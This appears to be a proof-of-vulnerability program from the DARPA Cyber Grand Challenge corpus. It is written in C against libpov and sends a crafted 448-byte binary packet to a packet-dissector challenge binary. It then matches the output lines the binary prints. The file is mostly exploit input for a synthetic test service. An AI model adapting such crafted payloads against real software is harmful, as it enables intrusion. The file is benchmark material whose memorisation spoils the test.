#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xc0\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xa8\x01\x00\x00\xa0\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xa0\x01\x00\x00"
         "\x3f\xca\xcb\x42\x49\x64\x7a\x13\xfe\xa5\xe1\xc4\x08\x2c\x20\x33"
         "\xd4\xd1\x70\xc4\x47\x00\x00\x00\xd9\x23\xc5\xf7\x60\x94\xb8\x31"
         "\x5e\x20\xbd\x32\x94\x52\x9e\xd1\x1d\xbc\xf1\xcc\x5a\x95\x80\xe2"
         "\x01\x00\xc2\x01\xec\x7e\xa4\x94\x71\xf5\x2e\xfa\xe9\x1c\x01\x00"
         "\x98\x41\x00\x01\x00\x24\xd2\xf2\x6d\x77\xa1\xed\xea\x24\xd2\x00"
         "\x77\xd7\x0b\x89\xd8\xef\x5a\xee\x03\x84\x99\x9a\x01\x00\xcb\xde"
         "\x76\x7b\x18\x94\x2b\x6a\x3b\xe1\x2a\x5d\x10\x0f\x9d\x01\x3e\x01"
         "\x7d\x0e\xb0\xec\x41\x00\x01\x00\xd4\x01\x3a\xff\x00\x34\xed\x84"
         "\xf4\xc0\xd9\x66\x85\x4d\x05\xce\x29\xed\xd2\x4d\x48\xd4\x18\xd9"
         "\xa1\x23\xc7\xe8\xf0\x4f\x92\xac\xc1\x42\xe1\x91\x39\x92\xb5\xd8"
         "\x2f\x43\x13\x85\x62\x9d\x57\x32\xd6\xad\x35\x2c\x3f\xdd\x6f\xb9"
         "\x3a\x05\x14\xfd\x55\xed\x94\x34\x04\x19\x03\x1b\x9a\x99\xe6\x3c"
         "\x69\xfa\xd5\x7b\x3e\x0d\x32\x0f\xf7\xf6\x46\x77\x00\xbd\xdc\x25"
         "\x48\x66\xba\x29\xe9\xf7\xd7\x09\x85\x7e\xbb\xee\x10\x23\x0d\x96"
         "\x11\xa3\x48\x78\x24\x4d\xf9\x2d\x01\x1c\xb6\x3a\x5b\xd0\x4d\xe6"
         "\xaf\xbc\x0b\x04\x07\x4c\x35\xfb\xa0\x51\x57\x1d\xf7\x27\xd5\xc0"
         "\x0c\x5c\x1e\x9d\x30\x15\x7c\xba\xeb\xf7\x17\x0c\xe1\x7b\x62\x12"
         "\x86\x41\x2f\x58\x17\x82\xda\x9c\x28\x65\x7a\x57\xbb\x01\x39\x73"
         "\x6f\x35\xcb\x9f\xe0\xa9\xe7\x01\xa0\x34\xbf\x18\xd6\x88\x3e\xa9"
         "\x34\x2f\x26\xc4\x12\x70\x60\xd0\x7a\x0a\x96\x55\xe7\x6a\xa4\xe4"
         "\x6a\xf1\x02\x53\xcc\x1a\x62\x23\x3e\x6a\x7b\xa7\x2d\xaf\xb2\xf5"
         "\x40\xf7\xcc\x39\x2b\xf3\x02\x86\x19\xdd\x2e\x74\xc7\xcf\x5b\x7a"
         "\x2f\x89\xc8\x84\x9f\x27\x72\x0b\xe7\x0a\xee\x90\x1f\x50\x67\x74"
         "\x61\xa2\xbd\xd1\xeb\xdb\x75\x71\xfc\x31\x37\x41\x00\x21\x8e\xfb"
         "\x5e\x01\x00\xaa\xe8\x7a\x90\xf8\xef\x6e\x21\x1d\x3c\x47\x4f\x9e"
         "\x28\xa4\x2e\xc4\x41\x00\x41\x00\x01\x00\x94\x01\x00\xc3\x07\x5c";
      static unsigned int write_00001_00000_len = 448;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaDonia
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x44\x6f\x6e\x69\x61";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
